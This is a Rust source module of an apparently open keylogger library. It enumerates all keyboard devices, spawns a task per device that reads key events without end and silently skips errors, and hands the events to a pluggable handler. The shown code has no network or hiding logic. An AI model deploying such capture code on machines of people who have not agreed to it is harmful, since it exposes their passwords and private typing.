use async_trait::async_trait;
use futures::future::join_all;
use std::path::Path;
use std::sync::Arc;

use crate::error::KeyloggerError;
use crate::keyboard::{find_keyboard_devices, KeyEvent, Keyboard};

pub(crate) type KeyloggerResult<T> = Result<T, KeyloggerError>;

#[async_trait]
pub trait KeyEventHandler: Send + Sync {
    async fn handle_events(&self, kb_device: &Path, kb_name: &str, ev: Vec<KeyEvent>);

    fn handle_err(&self, _err: KeyloggerError) -> Result<(), KeyloggerError> {
        // Ignore the error and keep on logging
        Ok(())
    }
}

pub struct Keylogger {
    ev_handler: Arc<dyn KeyEventHandler>,
    keyboards: Vec<Keyboard>,
}

impl Keylogger {
    /// Create a new `Keylogger`.
    pub fn new(ev_handler: impl KeyEventHandler + 'static) -> KeyloggerResult<Self> {
        Ok(Self {
            ev_handler: Arc::new(ev_handler),
            keyboards: find_keyboard_devices()?.collect(),
        })
    }

    /// Begin capturing key events.
    ///
    /// This function returns an error if no keyboard devices are detected.
    pub async fn capture(self) -> KeyloggerResult<()> {
        if self.keyboards.is_empty() {
            return Err(KeyloggerError::NoDevicesFound);
        }

        let handles = self
            .keyboards
            .into_iter()
            .map(|kb| {
                let ev_handler = Arc::clone(&self.ev_handler);

                tokio::spawn(Self::handle_key_events(ev_handler, kb))
            })
            .collect::<Vec<_>>();

        // Discard the result:
        let _ = join_all(handles).await;

        Err(KeyloggerError::KeyloggerTasksExited)
    }

    async fn handle_key_events(
        ev_handler: Arc<dyn KeyEventHandler>,
        keyboard: Keyboard,
    ) -> KeyloggerResult<()> {
        let keyboard = Arc::new(keyboard);

        loop {
            let events = match keyboard.read_key_events().await {
                Ok(events) => events,
                Err(e) => {
                    ev_handler.handle_err(e)?;
                    continue;
                }
            };

            if events.is_empty() {
                continue;
            }

            ev_handler
                .handle_events(&keyboard.device, &keyboard.name, events)
                .await;
        }
    }
}

#[cfg(test)]
mod tests {
    // TODO
}
